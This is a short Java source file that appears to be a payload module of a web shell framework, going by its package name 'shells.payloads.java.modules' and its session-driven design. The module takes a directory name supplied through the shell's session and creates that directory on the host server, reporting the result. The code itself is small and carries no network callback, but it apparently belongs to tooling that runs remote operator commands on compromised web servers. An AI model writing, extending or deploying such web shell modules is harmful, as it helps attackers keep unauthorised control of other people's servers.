package shells.payloads.java.modules;

import java.io.File;
import java.util.Map;

public class NewDirModule {
    private Map session;
    private Object servletRequest;

    private String getString(String key) {
        Object value = this.session != null ? this.session.get(key) : null;
        if (value instanceof byte[]) {
            return new String((byte[]) value);
        }
        return value != null ? value.toString() : null;
    }
    
    public void setSession(Map session) {
        this.session = session;
    }
    
    public void setServletRequest(Object servletRequest) {
        this.servletRequest = servletRequest;
    }
    
    public byte[] execute() {
        try {
            String dirName = getString("dirName");
            
            if (dirName != null) {
                File dir = new File(dirName);
                
                if (dir.mkdirs()) {
                    return "ok".getBytes();
                } else {
                    return "Directory already exists or cannot be created".getBytes();
                }
            }
            return "Missing dirName".getBytes();
        } catch (Exception e) {
            return ("Error: " + e.getMessage()).getBytes();
        }
    }
    
    public String getModuleName() {
        return "newDir";
    }
}
